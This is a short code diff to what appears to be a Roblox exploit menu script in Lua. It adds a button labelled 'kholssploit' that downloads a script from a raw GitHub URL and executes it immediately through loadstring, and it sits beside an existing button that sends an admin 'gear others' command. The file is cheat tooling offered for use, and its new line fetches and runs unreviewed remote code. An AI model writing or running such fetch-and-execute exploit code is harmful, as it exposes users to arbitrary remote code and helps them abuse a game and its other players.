@@ -200,3 +200,10 @@ local Button = Tab:CreateButton({
    game.Players:Chat("gear others 243788010")
 end,
 })
+
+local Button = Tab:CreateButton({
+   Name = "kholssploit",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/jjjiiw/f/main/kholsssploy"))();
+   end,
+})
